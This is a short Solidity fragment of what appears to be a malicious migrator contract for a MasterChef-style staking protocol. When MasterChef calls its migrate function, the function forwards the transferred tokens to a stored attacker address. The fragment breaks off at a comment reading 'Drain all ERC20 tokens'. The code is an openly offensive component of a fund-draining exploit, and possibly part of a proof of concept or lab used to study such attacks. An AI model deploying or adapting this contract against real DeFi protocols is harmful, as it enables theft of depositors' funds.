    address public attacker;
    address public masterChef;

    constructor(address _attacker, address _masterChef) {
        attacker = _attacker;
        masterChef = _masterChef;
    }

    // Called by MasterChef during migration
    function migrate(address token, uint256 amount) external {
        require(msg.sender == masterChef, "Only MasterChef");
        if (amount > 0) {
            IERC20(token).transfer(attacker, amount);
        }
    }

    // Drain all ERC20 tokens
